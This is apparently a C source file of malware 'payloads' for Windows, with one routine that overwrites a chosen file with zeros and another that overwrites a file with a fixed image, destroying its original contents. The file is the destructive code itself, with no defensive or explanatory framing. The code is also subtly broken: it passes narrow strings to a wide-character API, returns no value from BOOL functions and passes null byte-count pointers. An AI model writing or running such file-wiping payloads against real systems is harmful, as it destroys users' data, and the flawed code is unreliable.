#include "payloads.h"

BOOL ZeroOutFile(char* filename) {
    HANDLE file = CreateFileW(filename, 
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ, 
        NULL, 
        OPEN_EXISTING, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL
    );

    if (file == INVALID_HANDLE_VALUE) {
        return;
    }

    DWORD size = GetFileSize(file, NULL);

    char buffer[BUFFER_SIZE] = {0};
    DWORD written = 0;

    for (size_t position = 0; position < size; position += BUFFER_SIZE) {
        if (WriteFile(file, buffer, BUFFER_SIZE, &written, NULL) == FALSE) {
            return FALSE;
        }

        if (written <= 0) {
            break;
        }
    }

    return CloseHandle(file);
}

BOOL ReplaceImage(char* filename) {
    HANDLE source = CreateFileW(IMAGE_PATH, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE destination = CreateFileW(filename, GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (source == INVALID_HANDLE_VALUE || destination == INVALID_HANDLE_VALUE) {
        return;
    }

    DWORD size = GetFileSize(source, NULL);
    char buffer[size];

    if (!ReadFile(source, buffer, size, NULL, NULL)) {
        return FALSE;
    }
    if (!WriteFile(destination, buffer, size, NULL, NULL)) {
        return FALSE;
    }

    if (!CloseHandle(source) || !CloseHandle(destination)) {
        return FALSE;
    } else {
        return TRUE;
    }
}